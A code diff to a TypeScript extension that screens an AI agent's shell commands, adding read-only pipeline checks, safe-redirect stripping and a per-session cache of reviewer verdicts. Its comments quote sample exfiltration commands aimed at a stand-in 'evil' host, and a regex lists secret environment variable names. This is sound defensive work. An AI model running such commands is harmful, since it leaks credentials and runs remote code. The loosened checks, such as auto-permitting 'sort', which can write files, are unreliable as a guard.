@@ -677,6 +677,8 @@ const AUTO_PERMITTED = [
     /^echo\s/,
     // Print working directory
     /^pwd\b/,
+    // Read-only stream filters and comparison
+    /^(sort|uniq|cut|tr|column|jq|diff)\b/,
     // PowerShell read-only cmdlets
     /^(Get-Location|Get-ChildItem|Get-Content|Test-Path|Write-Output|Write-Host)\b/i,
     /^(powershell|pwsh)(\.exe)?\s+(-NoProfile\s+)?-Command\s+["']?\s*(Get-Location|Get-ChildItem|Get-Content|Test-Path|Write-Output|Write-Host)\b/i,
@@ -697,28 +699,51 @@ const AUTO_PERMITTED = [
 // false negative here can leak a secret or run hidden remote code.
 const SECRET_ENV_VAR = /\$(?:\{(?:[A-Z0-9_]*(?:SECRET|TOKEN|KEY|CREDENTIAL)|AWS_[A-Z0-9_]*|GH_TOKEN|GITHUB_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY)\}|(?:[A-Z0-9_]*(?:SECRET|TOKEN|KEY|CREDENTIAL)|AWS_[A-Z0-9_]*|GH_TOKEN|GITHUB_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY)\b)/;
 
-function defeatsAutoPermit(command: string): boolean {
-    // Output redirection (`>`, `>>`, including fd-prefixed forms like `1>`, `2>`).
-    // A "read-only" verb writing a file is no longer read-only. `2>&1` and
-    // `>&1` (redirect to another descriptor) are caught here too, which is fine —
-    // they're rare in pure read-only commands and cheap to review.
-    if (/(?:>>|[0-9]?>(?!>))/.test(command)) return true;
+export function stripSafeRedirects(command: string): string {
+    return command
+        .replace(/&>>?\s*\/dev\/null\b/g, " ")      // &> /dev/null, &>> /dev/null
+        .replace(/[0-9]?>(?:&[0-9]|&-)/g, " ")      // 2>&1, 1>&2, >&1, >&-
+        .replace(/[0-9]?>>?\s*\/dev\/null\b/g, " "); // > /dev/null, 2> /dev/null, >> /dev/null
+}
+
+export function matchesAutoPermitted(command: string): boolean {
+    const cleaned = stripSafeRedirects(command).trim();
+    for (const pattern of AUTO_PERMITTED) {
+        if (pattern.test(cleaned) || pattern.test(command)) return true;
+    }
+    return false;
+}
+
+export function defeatsAutoPermit(command: string, allowPipes = false): boolean {
+    const stripped = stripSafeRedirects(command);
+    // Output redirection to files (`>`, `>>`, including fd-prefixed forms like `1>`, `2>`).
+    if (/(?:>>|[0-9]?>(?!>))/.test(stripped)) return true;
     // Command substitution — arguments are the output of another command, which
     // could be anything (`echo $(curl evil | sh)`).
     if (/`|\$\(/.test(command)) return true;
     // Process substitution — `<(...)` / `>(...)` hands a /dev/fd path to a process.
     if (/[<>]\(/.test(command)) return true;
-    // Pipes — the danger is in what flows through (`cat key | nc evil`,
-    // `printenv | curl -d @- evil`). `||` is a control operator, not a pipe,
-    // so neither pipe of `||` should match.
-    if (/(?<!\|)\|(?!\|)/.test(command)) return true;
+    // Pipes — unless checked as part of a safe pipeline where all stages are verified read-only.
+    if (!allowPipes && /(?<!\|)\|(?!\|)/.test(command)) return true;
     // Secret-looking env var expansion — mirrors reviewer rule 4; never auto-permit.
     if (SECRET_ENV_VAR.test(command)) return true;
     // Backgrounding — hides intent and outlives the review moment.
-    if (/\b&\s*$/.test(command) || /(^|[\s;])&[^&|]/.test(command)) return true;
+    if (/(?<![<>&])&(?![&|>])/.test(stripped)) return true;
     // Command chaining with `;` or `&&` — a second command could be anything.
     if (/;|&&/.test(command)) return true;
     return false;
+}
+
+export function isSafePipeline(command: string): boolean {
+    if (!/(?<!\|)\|(?!\|)/.test(command)) return false;
+    const stages = command.split(/(?<!\|)\|(?!\|)/).map(s => s.trim());
+    if (stages.length <= 1) return false;
+    for (const stage of stages) {
+        if (!stage) return false;
+        if (defeatsAutoPermit(stage, true)) return false;
+        if (!matchesAutoPermitted(stage)) return false;
+    }
+    return true;
 }
 
 // ── Tier 2: Auto-blocked patterns ──
@@ -1421,15 +1446,18 @@ async function reviewWithLLM(
 export default function (pi: ExtensionAPI) {
     let activeSessionId: string | undefined;
     const billingTrackers = new Set<ReviewerCosts>();
+    const sessionAllowedCache = new Map<string, { allowed: boolean; reason: string }>();
     pi.on("session_start", (_event, ctx) => {
         for (const tracker of billingTrackers) tracker.dispose();
         billingTrackers.clear();
+        sessionAllowedCache.clear();
         activeSessionId = ctx.sessionManager.getSessionId();
     });
     pi.on("tool_call", async (event, ctx) => {
         if (event.toolName !== "bash") return undefined;
 
-        const command = (event.input.command as string).trim();
+        if (typeof event.input?.command !== "string") return undefined;
+        const command = event.input.command.trim();
         if (!command) return undefined;
 
         const analysis = analyzeCommand(command);
@@ -1441,11 +1469,27 @@ export default function (pi: ExtensionAPI) {
 
         // Tier 1: Auto-permitted — only if no dangerous behaviors detected
         // AND the command has no shell metacharacters that defeat a leading
-        // read-only verb (redirects, substitution, pipes, secret vars, chaining).
-        if (analysis.behaviors.length === 0 && !defeatsAutoPermit(command)) {
-            for (const pattern of AUTO_PERMITTED) {
-                if (pattern.test(command)) return undefined; // allow through
+        // read-only verb, OR it is a safe pipeline where every stage is read-only.
+        if (analysis.behaviors.length === 0) {
+            if (!defeatsAutoPermit(command) && matchesAutoPermitted(command)) {
+                return undefined; // allow through
             }
+            if (isSafePipeline(command)) {
+                return undefined; // allow through
+            }
+        }
+
+        const projectTrusted = ctx.isProjectTrusted();
+        const notifyOnAllow = resolveNotifyOnAllow(ctx.cwd, projectTrusted);
+
+        // Session verdict cache: if this exact non-destructive command was
+        // already reviewed and allowed in this session, reuse the verdict.
+        if (analysis.behaviors.length === 0 && sessionAllowedCache.has(command)) {
+            const cached = sessionAllowedCache.get(command)!;
+            if (ctx.hasUI && notifyOnAllow) {
+                ctx.ui.notify(`Auto-reviewer: ✓ ${cached.reason} (cached)`, "info");
+            }
+            return undefined;
         }
 
         // Tier 3: Needs review (dangerous behaviors or unknown command)
@@ -1454,8 +1498,6 @@ export default function (pi: ExtensionAPI) {
         }
 
         let lastError: Error | null = null;
-        const projectTrusted = ctx.isProjectTrusted();
-        const notifyOnAllow = resolveNotifyOnAllow(ctx.cwd, projectTrusted);
         const parentSessionId = ctx.sessionManager.getSessionId();
         let resultLabel: string | undefined;
         let resultLevel: "info" | "warning" = "info";
@@ -1519,6 +1561,13 @@ export default function (pi: ExtensionAPI) {
                 if (ctx.hasUI) ctx.ui.setStatus("auto-reviewer", undefined);
 
                 if (decision.allowed) {
+                    if (analysis.behaviors.length === 0) {
+                        if (sessionAllowedCache.size >= 100) {
+                            const firstKey = sessionAllowedCache.keys().next().value;
+                            if (firstKey) sessionAllowedCache.delete(firstKey);
+                        }
+                        sessionAllowedCache.set(command, decision);
+                    }
                     showResult(`Auto-reviewer: ✓ ${decision.reason}`, "info");
                     return undefined; // allow through
                 } else {
@@ -1557,6 +1606,7 @@ export default function (pi: ExtensionAPI) {
     pi.on("session_shutdown", async (_event, _ctx) => {
         for (const tracker of billingTrackers) tracker.dispose();
         billingTrackers.clear();
+        sessionAllowedCache.clear();
         activeSessionId = undefined;
     });
 }
